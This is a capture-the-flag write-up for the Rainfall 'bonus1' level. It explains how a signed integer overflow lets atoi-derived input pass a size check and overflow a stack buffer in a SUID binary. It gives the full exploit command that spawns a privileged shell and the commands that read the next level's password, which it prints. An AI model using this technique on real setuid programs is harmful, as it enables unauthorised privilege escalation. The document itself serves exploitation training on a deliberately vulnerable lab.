# level11

## 1. Connect to the VM

This level corresponds to the Rainfall `bonus1` binary.

The password for `bonus1`, obtained by solving `bonus0`, is:

```text
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

Connect with:

```bash
ssh bonus1@localhost -p 4242
```

## 2. Read the source

The equivalent C code obtained by decompiling the binary is available in
`source.c`.

The binary is owned by `bonus2` and has the SUID bit set. It therefore runs
with `bonus2` privileges.

The program converts the first argument with `atoi`:

```c
nb = atoi(argv[1]);
```

If `nb` is greater than 9, the program exits:

```c
if (nb > 9)
    return 1;
```

Otherwise it copies `nb * 4` bytes from the second argument into a 40-byte stack
buffer:

```c
memcpy(buffer, argv[2], nb * 4);
```

Finally, it opens a shell only if `nb` has the magic value `0x574f4c46`:

```c
if (nb == 0x574f4c46)
    execl("/bin/sh", "sh", NULL);
```

The objective is to pass the `nb > 9` check, then overflow `buffer` and replace
the saved `nb` value with `0x574f4c46`.

## 3. Understand the integer overflow

The stack layout puts `buffer` 40 bytes before `nb`:

```text
buffer: 40 bytes
nb:      4 bytes
```

A normal positive value cannot overflow the buffer enough:

```text
9 * 4 = 36 bytes
```

However, `memcpy` receives a `size_t` length. The multiplication is performed on
the signed 32-bit integer first, then the result is interpreted as an unsigned
copy size.

We need `nb * 4` to wrap to 44 bytes:

```text
40 bytes padding + 4 bytes new nb value = 44 bytes
```

The value `-2147483637` works:

```text
-2147483637 * 4 = -8589934548
```

Modulo 32 bits, this becomes:

```text
0x0000002c = 44
```

Since `-2147483637` is less than 9, it passes the check, but `memcpy` still
copies 44 bytes.

## 4. Build the payload

The target value is:

```text
0x574f4c46
```

In little-endian x86, this must be written as:

```text
\x46\x4c\x4f\x57
```

The payload is therefore:

```text
40 bytes of padding + \x46\x4c\x4f\x57
```

## 5. Exploit the binary

Run:

```bash
./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
```

The overwritten `nb` now equals `0x574f4c46`, so the program executes
`/bin/sh` with `bonus2` privileges.

Then read the next password:

```bash
cat /home/user/bonus2/.pass
```

The output contains:

```text
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```

This is the password stored in `flag` and can be used to connect as `bonus2`.
